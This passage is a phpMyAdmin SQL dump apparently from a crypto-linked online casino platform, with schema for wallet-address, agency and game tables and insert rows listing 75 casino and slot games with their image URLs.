-- phpMyAdmin SQL Dump
-- version 5.1.1
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1:3306
-- Generation Time: Jan 22, 2024 at 03:25 PM
-- Server version: 5.7.36
-- PHP Version: 7.3.33

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `api123b_v1`
--

-- --------------------------------------------------------

--
-- Table structure for table `address`
--

DROP TABLE IF EXISTS `address`;
CREATE TABLE IF NOT EXISTS `address` (
  `Address_ID` int(10) UNSIGNED NOT NULL,
  `Address_Currency` int(10) UNSIGNED NOT NULL COMMENT 'Loại tiền - Currency_ID (currency)',
  `Address_Address` varchar(255) COLLATE utf8_unicode_ci NOT NULL COMMENT 'Địa chỉ ví',
  `Address_User` varchar(20) COLLATE utf8_unicode_ci DEFAULT '0' COMMENT 'User_ID (users)',
  `Address_PrivateKey` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `Address_HexAddress` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `Address_CreateAt` datetime DEFAULT NULL,
  `Address_UpdateAt` datetime DEFAULT NULL,
  `Address_IsUse` tinyint(1) DEFAULT '0' COMMENT '0: Không sử dụng | 1: Đang sử dụng',
  `Address_Comment` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `agency`
--

DROP TABLE IF EXISTS `agency`;
CREATE TABLE IF NOT EXISTS `agency` (
  `id` int(11) NOT NULL,
  `email` varchar(255) CHARACTER SET utf8 NOT NULL,
  `country_id` int(11) DEFAULT NULL,
  `phone_number` int(20) DEFAULT NULL,
  `country_name` varchar(255) DEFAULT NULL,
  `name` varchar(255) NOT NULL,
  `birthday` datetime NOT NULL,
  `telegram_id` varchar(50) NOT NULL,
  `position` varchar(255) NOT NULL,
  `work` tinyint(1) NOT NULL,
  `resume` text CHARACTER SET utf8 COLLATE utf8_unicode_ci,
  `created_at` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `aggamelist`
--

DROP TABLE IF EXISTS `aggamelist`;
CREATE TABLE IF NOT EXISTS `aggamelist` (
  `id` int(11) NOT NULL,
  `game_code` varchar(100) NOT NULL,
  `game_name` varchar(100) NOT NULL,
  `game_type` varchar(100) NOT NULL,
  `game_typeWeb` varchar(100) NOT NULL,
  `game_h5` varchar(100) NOT NULL,
  `game_jackpot` varchar(100) NOT NULL,
  `game_image_url` text NOT NULL,
  `game_display_name` varchar(100) NOT NULL,
  `game_show` int(11) NOT NULL,
  `game_play` tinyint(1) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `aggamelist`
--

INSERT INTO `aggamelist` (`id`, `game_code`, `game_name`, `game_type`, `game_typeWeb`, `game_h5`, `game_jackpot`, `game_image_url`, `game_display_name`, `game_show`, `game_play`) VALUES
(1, 'roulette_36', 'Roulette 36', 'online_casino', 'online_casino', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_LIWi5oAx4cj8h1mIrNmAK7O8DTtG0QDbkDVzkYUX0KrSdKJv4C943ZRzkfwJtCm1o2vpVH9ywDR4oLMj7ivAyQ==.jpeg', 'Roulette 36', 0, 0),
(2, 'roulette_24', 'Roulette 24', 'online_casino', 'online_casino', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_TCOHlxtF9Kse0kOgrh1ypmcolKcXHHyQHQ5PjsAgMBdC0RO2KNwAEkvkWPGOiVyI6WGQAh2XVF0qowSjYIHfoQ==.jpeg', 'Roulette 24', 0, 0),
(3, 'casino_sicbo', 'Sic Bo', 'online_casino', 'online_casino', '1', '0', 'https://media.eggsbook.com/coin/sicbo.png', 'Sic Bo', 0, 0),
(4, 'casino_sicbo_fish_prawn_crab', 'Fish Prawn Crab', 'online_casino', 'online_casino', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_9UvoiCNdnVo2Qllm6EcTfNalrBhrWf94mO9O67NIudD7oNo9cjI3ErkBb46Q8kO77b8K934K6eN8ttWJ1aCnbw==.jpeg', 'Fish Prawn Crab', 0, 0),
(5, 'casino_baccarat', 'Baccarat', 'online_casino', 'online_casino', '1', '0', 'https://media.eggsbook.com/mini-game/baccarat.png', 'Baccarat', 1, 1),
(6, 'casino_belangkai', 'Belangkai', 'online_casino', 'online_casino', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_r7iLPnk1Lb4PJJZik5X1mXrBhxY952whTJ9mBmXYRdVwUw449bSPHp93GO7ABQhZzrJLfAzolvo66zO10nGpAA==.jpeg', 'Belangkai', 0, 0),
(7, 'casino_blackjack', 'Blackjack', 'online_casino', 'online_casino', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_zXA18jIVT2pxPKJ28P6aCcAM5nzQdKyP3Ao8IkSdWj70tO1EHSpBsYsbB5mAngHcFiGpO2ExByrY6P8euwThHg==.jpeg', 'Blackjack', 0, 0),
(8, 'casino_dragontiger', 'Dragon Tiger', 'online_casino', 'online_casino', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_KaSAYpdWilpRbzfAwWoYfo4DC1ZLtRGhkv8pJfy9PCqBFlV4t4gKmqgc4OCJCexAXqJd4XRxveE84yeiv3e7TQ==.jpeg', 'Dragon Tiger', 0, 0),
(9, 'casino_sedie', 'Se Die', 'online_casino', 'online_casino', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_xFelB9g7ilrJjfpiM4CwewE2PDbEWPieuL4SHeZCLSBHXSYYojpw3J6RyZukYnGruLp0oc2cgNO5grnTNigyfQ==.jpeg', 'Se Die', 0, 0),
(10, 'casino_niuniu', 'Niuniu', 'online_casino', 'online_casino', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_Qxcb7nWjxY37yWskDrgkM4RAS2MMippQYEyImxuui7iRrbHbh2HDQkPklf4GHLw7wuPcFOWQX4LKcsFv4r7O7w==.jpeg', 'Niuniu', 0, 0),
(11, 'roulette_36_syncres', 'Roulette 36 Synchronize', 'online_casino', 'online_casino', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_pdh7Bo6IEwBWlkG8noS9kHolkWl9kumRIiae1iDfxAKKyMf7lJENu9PJdTM1YMuA6902YI8suxKOQmLpyipz3w==.jpeg', 'Roulette 36 Synchronize', 0, 0),
(12, 'casino_baccarat_syncres', 'Baccarat Synchronize', 'online_casino', 'online_casino', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_aDjq56uytAhR8IFLZKkpsI9CYpBbjP8mees6Pd3z8eOu6xlNC0k5cGZPUCispZubHgjaFn4LAOZFLbCR3JAndg==.jpeg', 'Baccarat Synchronize', 0, 0),
(13, 'casino_sedie_syncres', 'Se Die Synchronize', 'online_casino', 'online_casino', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_mOYcaqfQwkPwJnXszYXRzhEBjRqZw1Slu3ohIhj5OJIyXPYe78ZNyQOlh8picIrp2EQZpFTEk3ZqSvyCguBBRA==.jpeg', 'Se Die Synchronize', 0, 0),
(14, 'casino_dragontiger_syncres', 'Dragon Tiger Synchronize', 'online_casino', 'online_casino', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_LzVkKtERJxgHD4aROuHVTrJaZu5BivcenToIwqQXemn86PHTrsKWe9mBUn7bi1aMhDGnucDV18IeUwOJcetEXA==.jpeg', 'Dragon Tiger Synchronize', 0, 0),
(15, 'casino_niuniu_syncres', 'Niuniu Synchronize', 'online_casino', 'online_casino', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_WrXjYrNuKVgHcNO5ffg19YUbG1oI5GusO1jwHfGLFltxOOsPXjxfibJMvbvpCYauJHbjbtNJH3iHvQIqo8ZNBw==.jpeg', 'Niuniu Synchronize', 0, 0),
(16, 'race_thunderbolt', 'Thunder Bolt', 'singleplayer_games', 'race', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_3zmt56lg3lLanXT9QYsVtSrlkJx7ls2ZWNmH7SjBflucSixmPG8wcdfdiiWSLg46IgcCeKtfbiPZAe1eWXWLcg==.jpeg', 'Thunder Bolt', 0, 0),
(17, 'slot_highwayking', 'Highway King', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/agency/win8club/product/gimg/_gimg_sZLUf09QzpgME3cp7M4QivNSNMx4plZJeGTJGA9xVJWnRunD9NIT8NhhxpNyKrBFIlADPgxhkJsp7yvGgHHH6Q==.jpeg', 'Highway King', 0, 0),
(18, 'slot_golf', 'Golden Tours', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_Xs448aWiQkFTQemWZUyvewxcGRc53UfitozZ3OSOXs9sWKhlfJFXqpmNkbuwMqs1Q6F8ppl91Bhyth2ZaRSDng==.jpeg', 'Golden Tours', 0, 0),
(19, 'slot_aztecs', 'Aztechs', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_Cg2S7CjjsAEnN4vkkAps46XvlsMmBh7tnJOAUdaIKoKfVT31XkgsjjBTKeoSPRHKzxVil5CYrRzUQEpc1T51Lg==.jpeg', 'Aztechs', 0, 0),
(20, 'slot_dolphinreef', 'Dolphin Reef', 'singleplayer_games', 'slot', '1', '0', 'https://media.eggsbook.com/mini-game/dolphin-reef.png', 'Dolphin Reef', 1, 1),
(21, 'slot_jinpingmei', 'Jin Ping Mei', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_vHW3s4RZkUfDKvB2pm1jLAgivXqGbTYwvUBBupU6tWxEQieUT43Iu0CHdQedCSltIqYd9Hg8xa7JM33Xi6tiKA==.jpeg', 'Jin Ping Mei', 0, 0),
(22, 'slot_fadacai', 'Fa Da Cai', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_omVp2tbgS3NYYdM5Oir7pLQh00Gtr04VpfKNGDKDlyru2wwNGaLSU3HC7IGqyneXiJlyNNZ5Bl1PlOK9wGEPaQ==.jpeg', 'Fa Da Cai', 0, 0),
(23, 'slot_cherrylove', 'Cherry Love', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_KaSruALjLyuRzqMoD0Nd0Gdf7B7g2OTkzox3gdqpZNTZgz6kfD2dKqMqYorccZAbeRTcmvEDkvfQoYVY7dTnMQ==.jpeg', 'Cherry Love', 0, 0),
(24, 'slot_mysticdragon', 'Mystic Dragon', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_qenyW1y5Ee07pVXCTcCSZy35frAdQOKQEuixHgBN0rK237BtQLqzh2rqAONNr14iu2F7hPuch2xgX8qdZPF2vA==.jpeg', 'Mystic Dragon', 0, 0),
(25, 'slot_greatstars', 'Great Stars', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_ab9JAw7YKm1yFuuLipMi8mDjHsV5wNBwvCOPTI2eDMlFARV5DDL1J6xJ5U1EyTRESPEm8kudcgYZyp42UjMXOw==.jpeg', 'Great Stars', 0, 0),
(26, 'runlight_monkeyking', 'Monkey King', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_pbqpo1pDqzrVoQYHko5Vjeb9UvKRj1CoaHjsLeJf7GQ4YeMAaGByoiyKzLuyjIZdkxzJLvrPfehdEmPgvogEZg==.jpeg', 'Monkey King', 0, 0),
(27, 'slot_seacaptain', 'Sea Captain', 'singleplayer_games', 'slot', '1', '1', 'https://media.eggsbook.com/mini-game/sea-captain.png', 'Sea Captain', 1, 1),
(28, 'slot_3kingdoms', 'Three Kingdoms', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/agency/win8club/product/gimg/_gimg_WmjsZBm7GRRJNpIfGY7NqhN2dDNy9BhwBaWq9PBnmln52n4u8a1Uqx1vEFW39heHlrFnxAJNohOnE7n7WZpRYQ==.jpeg', 'Three Kingdoms', 0, 0),
(29, 'slot_garden', 'Garden', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_ZytlWsayHOgPQ3t24Paor0fGRYewegFPkCYY1W6HaHAqeG6VJKbEJ6ygvT2jH0HteYPz5eMZiJeZlTKvzh8MbA==.jpeg', 'Garden', 0, 0),
(30, 'slot_paydirt', 'Pay Dirt', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_baFRo6y5pEWfHFHUdbPMZa3qb5O8xYwPJGcKQhgwii2J8kDs9lYoBb4H79fG2wLBWANqJrOk0flzRKG93czrnQ==.jpeg', 'Pay Dirt', 0, 0),
(31, 'race_horse', 'Racing Horse', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_ZXAnobnoaU9rPUNIi2rwRgJ7xM48NEkacTPr02jfmSe2Z38cvlB1VjdpPPAg0vkCxddCb3K2j9jEzO5Zqxd3ug==.jpeg', 'Racing Horse', 0, 0),
(32, 'slot_ronin', 'Ronin', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_F4HJEya7SWUsAPm9DI6ddNQ1kunJ9CEnox456hXFDWgUPTGj5kSgRwo8hE4rsqzZym4IjA6z4x3JQBk8NbxtCg==.jpeg', 'Ronin', 0, 0),
(33, 'slot_greatblue', 'Great Blue', 'singleplayer_games', 'slot', '1', '1', 'https://media.eggsbook.com/mini-game/great-blue.png', 'Great Blue', 1, 1),
(34, 'slot_captaintreasure', 'Captain Treasure', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/agency/win8club/product/gimg/_gimg_JdHBgPiPqPIbLsDcPr6HVVHqudA4G5lNG8Q3XMdepAjR4OOVxa7Ip39aFDCC94UKBlPNj3I6XvzugQ2hWdjUtg==.jpeg', 'Captain Treasure', 0, 0),
(35, 'slot_kimochii', 'Kimochii', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_cVjZoqFoqNCu65mEKuZrIXqnFd7GYJIv4lLo1GIEszKyVPXlrTEu4mCBnglR4QZYEFPkg3jznL76dT5zd5YZhw==.jpeg', 'Kimochii', 0, 0),
(36, 'slot_crystalwaters', 'Crystal Waters', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_cxQrUv92veFBkkJlXslPiCHSjywudFH64WgGkA9f0oUj1PUTNPVqjXPD3qzLx0YhjEAVFMworjFE6gJ1J0DGbw==.jpeg', 'Crystal Waters', 0, 0),
(37, 'slot_penguinvacation', 'Penguin Vacation', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_0GjYr98P75CTvIljv3vwtgpCl7wNwTyTsirhb4d9zYUGYMDnHhKSIGp2PpI4995ZMiJsA5qeUQRB3ca144ndxA==.jpeg', 'Penguin Vacation', 0, 0),
(38, 'slot_avengers', 'Avengers', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_1f0gHRE9ZCnkm2Mgx7piPTkrqZTCySqNpFH3RdTKERv4QBWtob0pq3dpQqdSFBPxlUgXO6WVx7yFN5ElUx8Mtg==.jpeg', 'Avengers', 0, 0),
(39, 'slot_thaiparadise', 'Thai Paradise', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/agency/win8club/product/gimg/_gimg_ebPdaJ6DWZsM3O7MH6bsW2WITpNa4xDJr7tBI6Tx9XSCCmzZbTUOfTdDsgc4wLcGql7M90F0cDSC7eLuzdMF0w==.jpeg', 'Thai Paradise', 0, 0),
(40, 'slot_panjinlian', 'Pan Jin Lian', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_kG7JmMWOe7rPutzZugkQ50iEhmApJ3F7l8NtBshXIlsEw1nkaQRsaxpKTThenj1hFVG7Ji6K9eY7IrjbrcFSDw==.jpeg', 'Pan Jin Lian', 0, 0),
(41, 'slot_silverbullet', 'Silver Bullet', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/agency/win8club/product/gimg/_gimg_rWgTUwGUxXbjNqiS4vpzLMEdecwWrrd7DNsMB4RHrr1sEDydwdhWZbUX5o1zpsvXDSM3zxN0eGu9WrrGsHfrYA==.jpeg', 'Silver Bullet', 0, 0),
(42, 'slot_captreasure2', 'Captain Treasure 2', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/agency/win8club/product/gimg/_gimg_ftgVdARCG1VDl0QPlZhHuQ7qhM7hhiZ3ElYZt70vHG5PahTR3fWgkbPnH7qLBTr1Cz8WJNvzAM5UOdJSMsv3vA==.jpeg', 'Captain Treasure 2', 0, 0),
(43, 'slot_fruitytutti', 'Fruity Tutti', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_2tbHdo3UEIdxF8bL64qquzLRPRV5TnhB5UavpNH2tMj0yiOp39SJZjK2VlpkbQ0ettzd1y0Ug0CNJvZKE0dBSw==.jpeg', 'Fruity Tutti', 0, 0),
(44, 'slot_wealth', 'Wealths Treasure', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_oV5dUlIUvgrqBfN9xjb7Kjb2L95HlC9veCreSxAZmbMTZQ7P0TH9gM68j2uYwPyTEGXUZM0azYceUDpAa2rcrA==.jpeg', 'Wealths Treasure', 0, 0),
(45, 'slot_sparta', 'Sparta', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_IVPew0iBOLYXl5M1byVAB4kigVVyzepvZ6gHHgLl58KRjzdD19fGXDtmYzOjFWTAOVpUTnsW5oq7WjUPZeITeA==.jpeg', 'Sparta', 0, 0),
(46, 'slot_romenglory', 'Rome N Glory', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/agency/win8club/product/gimg/_gimg_ftmjTYvw6Z5IK2Y7rUqZgQRh3oz8u32OKIYCoyZmOpRDwN4bBx69tw1PGsIcNIAyhlgcywiwvuvxtOrKV8k78g==.jpeg', 'Rome N Glory', 0, 0),
(47, 'slot_orientexpress', 'Orient Express', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_VowqQyVp7VtbZ0RR4Sqg3BkfjmLCPelyn5x20sNLU3fCe4sm1YhmVwq4Q9IVIdvXREy1RmfRz1tcpW1uGOsHOQ==.jpeg', 'Orient Express', 0, 0),
(48, 'slot_goldenlotus', 'Golden Lotus', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_6tr9Bdn6vwKNkmVcTXsZTSILAXjMGBxM86qVVirkpUcpfRXo8o7HyhX6rZzuQFE8YTfWYZGeViViJqUuqW5MYQ==.jpeg', 'Golden Lotus', 0, 0),
(49, 'slot_lottomadness', 'Lotto Madness', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/agency/win8club/product/gimg/_gimg_PEir64WUZtgO7I9T8uJvrc9xOKWkw94nWPuC4MkyybMKYeWcQjVYfg0AlQzWGhpNjFLSLXyWE57PjhgxQ8ut1A==.jpeg', 'Lotto Madness', 0, 0),
(50, 'slot_tripletwister', 'Triple Twister', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_6NLRdXZviSzEUXSDoRxdpQwKh7acLZbQ10SVU8waYtZrQ7WxoiZOpOb0phdB83NqhfEe3l3jbnRQn73GTUPcyQ==.jpeg', 'Triple Twister', 0, 0),
(51, 'slot_panthermoon', 'Panther Moon', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/agency/win8club/product/gimg/_gimg_UmRJAgnmsgq7ssILecGvfiqsBzMDfiQuPvOwW70YQbIsgD3VVrfEcBvmYuOIpIb83QOOwBlNpn1i3SENvUU5Zw==.jpeg', 'Panther Moon', 0, 0),
(52, 'slot_greenlight', 'Green Light', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_vW9Ph17PSSFMYHSpkdId4f08PvwcES5L3OneTXLk0ZngcqNJihHzToopIPTTGsneQ9NTxdpc0NEi67ifxzNaag==.jpeg', 'Green Light', 0, 0),
(53, 'slot_tridentwarrior', 'Trident Warrior', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_kpdBp7ypwHsXO6FjkNLK5gfYXvaSfqsgumW5daTOdE3ljqFf1nSLYgB9IravLZIWI2UpyektVCVDXOTcdDQFVg==.jpeg', 'Trident Warrior', 0, 0),
(54, 'slot_spartan', 'Spartan 2', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_3e6bptm3IkBA3KYPE8tPUcW6WwZN4db2F7YNJfJUA5sGBRHoY29ho6FSm3iWIm9dgFYwzkKjQj0KkEHPXahZnQ==.jpeg', 'Spartan 2', 0, 0),
(55, 'slot_trex', 'T-Rex', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/agency/win8club/product/gimg/_gimg_WRAlfxQgcMTUyCAh3IvJ35vW7QJsaHRiKss9dry9GzyxnX7A2t7EErdYbLqFX3c6CVQ5i8ALbzz1i1dZv2w3Zw==.jpeg', 'T-Rex', 0, 0),
(56, 'slot_goldbeard', 'Gold Beard', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_15UN8GFOCxkgeV5p1wC2sEH7mJSFelGWLFFirVltgkqSPIkIrSpu0z0Fy2PDlE6UBY2Krj2ErYYwWjwQL0gDRQ==.jpeg', 'Gold Beard', 0, 0),
(57, 'slot_aladdinwishes', 'Aladdin Wishes', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_mXSvgBzi0SDdE1JXKyVWB7dntT1C0vh4n00wYpI31H1eBpM7C5p5QjgIwTMMLc0jqSWCsMMINh4NOzVxPGtC3w==.jpeg', 'Aladdin Wishes', 0, 0),
(58, 'slot_achilles', 'Achilles', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_jbPkLNJtikO7HkRdPLxLm1lkNbhbYTGMJGwwp0jDw8TrRiDs4ReKEXKV3M6XyXpjRjtk65UlU7IcsqmiIgurWg==.jpeg', 'Achilles', 0, 0),
(59, 'slot_coyotecash', 'Coyote Cash', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_7WmUxTHpQH1DQcuL2ek3wNuZD6ac2ebLqRayWz0YU4vYvd5cYry8a2slbcCZkDZvUHKl6txyrKkINgYJe2w4Qw==.jpeg', 'Coyote Cash', 0, 0),
(60, 'slot_silentsamurai', 'Silent Samurai', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_0sq27P5G81lIMKhGev4Y6oH10jqA2zZJNeeqqhGqukjkmLSJyIiwpWmLakRJD96vali0Bh1JxGlixvAl1v9bFA==.jpeg', 'Silent Samurai', 0, 0),
(61, 'slot_cleopatragold', 'Cleopatra Gold', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_nrAOTO61WyKxF3kHtdA4O28CXBS7uG6aelRoPysoBLboX1pOdSOOXcG4LI7DGCl7HjQU2mLBlGlGlqaPcjv4gQ==.jpeg', 'Cleopatra Gold', 0, 0),
(62, 'slot_dolphin2', 'Dolphin 2', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/agency/win8club/product/gimg/_gimg_WmQ6RWGAvnazfN5FFxd5bpx5AqLdamKd0n2osA3DZHmXsmJg1StaC36NPahtDM5rqwxzj21KvYgHBE4FVpZyKQ==.jpeg', 'Dolphin 2', 0, 0),
(63, 'slot_deserttreasure', 'Desert Treasure', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_rfTSelRjXj67UKmax50kK1PVrxuYbGMp9x2VRNiVHJfYgi9b9gOaX7GTDvYar1ujZVsj157ahVNRjK0SUAF58A==.jpeg', 'Desert Treasure', 0, 0),
(64, 'slot_japanforture', 'Japan Forture', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_3RPstHSHyiasMOWcOSvX3jbYz5ByDYwARG0NONAnZo3jTZzhfyR0lnjY792r2jjMGA2eQMFzRnIbF7J2u2OqbQ==.jpeg', 'Japan Forture', 0, 0),
(65, 'slot_tallyho', 'Tally Ho', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_hoU7VgQ1SFAjxrWlgE3TDnlY6OVac6R0207RuvGem5NsGmQAf50XbCtD51nrQZvLAd1Lq2Nr0FSDZOrQmTL1hQ==.jpeg', 'Tally Ho', 0, 0),
(66, 'slot_stripernight', 'Striper Night', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_FO6DJ9eKnjWd5UUFifHkrKKqtTEO8MH0c2hkShiZIE9xyuGLqt29iWcJei5etU3ZPUHfkOSoIq0TAmfuysJJvw==.jpeg', 'Striper Night', 0, 0),
(67, 'slot_fengshen', 'Feng Shen', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/agency/win8club/product/gimg/_gimg_ldKUXgUlhucRhGfOoqFNAAiTBzo8xQj103MpycwiH5pFP4FBw3Mu3ZC3fd31QOOet7J9PUT11ZCTslLu6L3VlQ==.jpeg', 'Feng Shen', 0, 0),
(68, 'slot_iceland', 'Ice Land', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_QzMwBjGGYxZ51zS33QqmCgPJLN8qBjBlFGLmAzGXf6AMjj5oftuGptr3MCJmUrxor0ae8JEx4wygZMOJfpgOKg==.jpeg', 'Ice Land', 0, 0),
(69, 'slot_greatchina', 'Great China', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_aYRsB6RhU1dyRutS6MBtVsqWkaitBFhS6oNseH6WEcW79P1BDvwQvtJSwi8D5QrfOHyCcRlmfLOEKVxDvsvhHw==.jpeg', 'Great China', 0, 0),
(70, 'slot_amazingthailand', 'Amazing Thailand', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_rhU0fFEZ5GiCOWf3UizxANAqC6lTyQsMk9e3IzX9NJVftSp7mJCbciu2ErG7EZhzaPgrbdetzYbRXrQBUzj22g==.jpeg', 'Amazing Thailand', 0, 0),
(71, 'slot_loosecaboose', 'Loose Caboose', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_vpM0pa61RXrpa4yKI99FluyLWQfTJAuJrqTpqdSPynwvuEyuMkDhtFcXBDBPLgSClPGcDp2bt22hAuxWyfFqsA==.jpeg', 'Loose Caboose', 0, 0),
(72, 'slot_emperorgate', 'Emperor Gate', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_YPYOGDNm2htSiMrLHF8UYuE9EeUb08Dy4z7Ipd765qsT6Me7McGJwe0GwXyWw3fPezK0jI2MOidiijIQzRlV1w==.jpeg', 'Emperor Gate', 0, 0),
(73, 'slot_footballrules', 'Foot Ball Rules', 'singleplayer_games', 'slot', '1', '0', 'https://media.eggsbook.com/mini-game/foot-ball-rules.png', 'Foot Ball Rules', 1, 1),
(74, 'slot_geishastory', 'Geisha Story', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_Ct3XmHycK3qeit6ZtjlsjjRyhhkG4GvJlWy09HLGj9VbJ3c9GNW2ExUaLDx9c2njlyST64Sb4cogMLQaUM3grg==.jpeg', 'Geisha Story', 0, 0),
(75, 'slot_bonusbear', 'Bonus Bear', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_mkp7JW5EaIgGEIsEY2xnDpGn1VnoR5Vxzqinarpk2djMVYiXu7vkgPZVDKfUEA8pNshaAPLfa5K3iTAWAP8oyQ==.jpeg', 'Bonus Bear', 0, 0),
